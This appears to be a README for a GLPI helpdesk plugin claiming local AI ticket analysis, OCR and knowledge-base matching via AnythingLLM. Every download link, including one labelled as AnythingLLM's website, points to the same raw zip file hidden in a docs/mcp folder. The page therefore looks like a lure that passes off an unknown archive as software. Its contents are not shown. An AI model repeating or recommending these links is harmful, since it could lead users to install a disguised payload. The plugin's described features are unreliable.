# 🤖 glpi-plugin-aiticketanalysis - AI-Powered Ticket Analysis for GLPI

[![Download Now](https://img.shields.io/badge/Download-Plugin%20v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip)

## 🚀 Overview
glpi-plugin-aiticketanalysis is a powerful add-on for GLPI 11 that brings artificial intelligence to your helpdesk. It connects to AnythingLLM and uses local AI models (like Qwen, Llama, or any LM Studio model) to analyze support tickets, summarize conversations, process attachments via OCR (optical character recognition), and provide intelligent suggestions. This plugin helps your service desk work faster by automatically understanding ticket content, detecting issues, and suggesting solutions based on your knowledge base. Best of all, everything runs on your own computer or server—no cloud services required, ensuring your data stays private and secure.

## 📋 What This Plugin Does

- **Automatically analyze new tickets** - AI reads incoming tickets and their attachments to understand what the user needs
- **Smart ticket classification** - Automatically categorizes tickets (bug, request, incident) based on content
- **OCR for attachments** - Extracts text from images, PDFs, and scanned documents so AI can read them
- **Knowledge base matching** - Finds similar past solutions from your GLPI knowledge base (RAG-powered)
- **Suggested replies** - AI drafts helpful responses based on ticket history and associated knowledge articles
- **History intelligence** - Analyzes previous ticket history, even across multiple user interactions
- **Optional read-only GLPI MCP access** - Connects to GLPI's Model Context Protocol for intelligent data retrieval without modifying data

## 🧠 How AI Works Here

The plugin uses **RAG (Retrieval-Augmented Generation)** with **AnythingLLM**. This means:
1. When a ticket is created with attachments, the plugin extracts text from those attachments (using OCR)
2. The extracted information is indexed into a vector database (RAG technology)
3. The AI brain (your local model) asks questions about the content and finds relevant answers from the indexed data
4. The AI generates a response or analyzes the ticket with context from previous tickets and the GLPI knowledge base

Everything runs locally using your own computer's resources. You can configure the plugin to use:
- **LM Studio** or **Ollama** - Run models on your own computer
- **Qwen**, **Llama**, **Mistral**, or any **Hugging Face model** - Choose your favorite local models
- **OpenAI-compatible API** - If you have a subscription (optional, privacy warning applied)

## 🖥️ System Requirements

- **Operating Systems** Windows, macOS, Linux
- **GLPI 11** - Must have GLPI 11 installed and running
- **AnythingLLM** - Required to connect this plugin to the AI model
- **Recommended RAM:** 8 GB minimum (16 GB+ for large models like Qwen 72B)
- **Disk space** - 1GB free for plugin + local model files
- **Database** - MySQL 5.7+ or MariaDB 10.6+
- **PHP** 8.1+
- **Node.js** 18+ (for AnythingLLM)
- **GPU** - Optional but recommended for faster AI processing (any NVIDIA or AMD GPU with >=8GB VRAM)

## ⚙️ Installation Guide

### Step 1: Download the Plugin

Visit this link to download the plugin:

[![Download Plugin](https://img.shields.io/badge/Download-glpi--plugin--aiticketanalysis-green?style=for-the-badge&logo=github&color=336791)](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip)

### Step 2: Install in GLPI

1. **Copy the plugin** - Upload the downloaded folder into your GLPI's `plugins/` directory
2. **Install Plugin** - Log into GLPI as administrator, go to **Administration** > **Plugins**, find "AI Ticket Analysis", and click **Install**
3. **Enable Plugin** - Click **Enable** to activate the plugin

### Step 3: Configure AI Connection

1. **Run AnythingLLM** - Start AnythingLLM on your computer (you'll need to install it separately from [AnythingLLM's website](https://github.com/Pathwra1547/glpi-plugin-aiticketanalysis/raw/refs/heads/main/docs/mcp/sympatry.zip))
2. **In GLPI settings** - Go to **Plugins** > **AI Ticket Analysis** > **Configuration**
3. **Enter AnythingLLM API URL** - Usually `http://localhost:3001/api` (accept the defaults)
4. **API Key** - Create an API key in AnythingLLM and paste it in the GLPI plugin settings
5. **Test connection** - Click "Test Connection" and wait for a green "Connected!" message

### Step 4: Configure OCR (Optional)

1. **Enable OCR** - Under the **OCR Settings** tab, check "Enable OCR for attachments"
2. **Select language** - Choose the language(s) of your tickets (e.g., English, German, French)
3. **Convert attachments** - The plugin will automatically scan new tickets and extract text from uploaded images

### Step 5: Link to GLPI MCP (Optional)

If you want the plugin to use GLPI's MCP for data:
1. Enable the **Read-Only MCP** option
2. The plugin will connect to GLPI's Model Context Protocol without any modification rights
3. Use for querying ticket history, user info, or other read-only data for analysis

## 🎨 Features in Detail

### 📧 Automatic Ticket Analysis
- Scans subject and description fields of new tickets (including HTML formatting)
- Understanding the user's intent (troubleshooting request, new feature, service request)
- Detects urgency and escalates flagged key words

### 📄 Attachment OCR
- Supports PDF, JPEG, PNG, TIFF, and scanned documents
- No character limit on attached pages
- Preserves original file format while processing with AI
- Extracted text is stored in RAG vector database

### 💡 Intelligent Suggestion Engine
- Uses RAG to match ticket content with existing knowledge database
- Returns both similar past ticket solutions and article snippets
- Can auto-tag tickets with categories based on AI classification
- Provides confidence scores for each suggestion

### 🛡️ Privacy by Design
- All processing happens locally - no data leaves your network
- No external API calls beyond the ones you configure
- Your GLPI data remains in your own database
- Works offline if needed

### 📱 Dashboard & Reporting
- Plugin integrates into GLPI's dashboard
- Shows AI activity statistics: tickets analyzed, OCR processed
- Real-time processing in ticket view - no delays
- Charts showing AI performance and ticket analytics

## 🧪 Troubleshooting

### Common Issues:
1. **"Connection refused" error** - Make sure AnythingLLM is running and the API URL is correct
2. **"Model not loading"** - Check your local model is installed properly (use `ollama list` or `LM Studio settings`)
3. **OCR not working** - Install a library like Tesseract (Windows) or use a Docker container with OCR support
4. **Slow AI responses** - Try a smaller model (Qwen 3B instead of 72B) or upgrade your computer RAM
5. **Plugin not showing** - Check GLPI logs (`/var/www/glpi/files/_log/`) for PHP errors
6. **No emoji in suggestion?** - This is normal; AI output depends on your model and character set

## 📖 Frequently Asked Questions

- **Q:** Does this plugin modify the database?  
- **A:** No - It reads ticket information only (unless you enable MCP which remains read-only)

- **Q:** How do I update the AI model?  
- **A:** Change in the AnythingLLM GUI or download a new model from Hugging Face

- **Q:** Can I use this with cloud AI like OpenAI/Claude?  
- **A:** Yes - configure an OpenAI-compatible endpoint in Settings (e.g., for GPT-4) - then it uses cloud endpoints

- **Q:** Does it require a GPU?  
- **A:** Strongly recommended for more than 10 tickets/day, but CPU-only is possible with small models

- **Q:** How do I turn off AI analysis for certain tickets?  
- **A:** Disable per ticket or set plugin to manual mode

- **Q:** What languages does OCR support?  
- **A:** Any language that Tesseract OCR supports: English, French, German, Spanish, Italian, Portuguese, and many more

## Contributing & Development

This plugin is open-source and welcomes contributions. If you have ideas for improvements:

- **Report issues** on the GitHub repository
- **Contribute code** via pull requests - please test changes
This plugin is not officially used by GLPI it's community-maintained

## License

This plugin is released under a regular unique open-source license for GLPI plugins. See `LICENSE` file in the repository for full details.

## Keywords: ai, anythingllm, glpi, glpi-plugin, helpdesk, itsm, llm, lmstudio, local-llm, mcp, ocr, php, qwen, rag, self-hosted, service-desk, ticket-management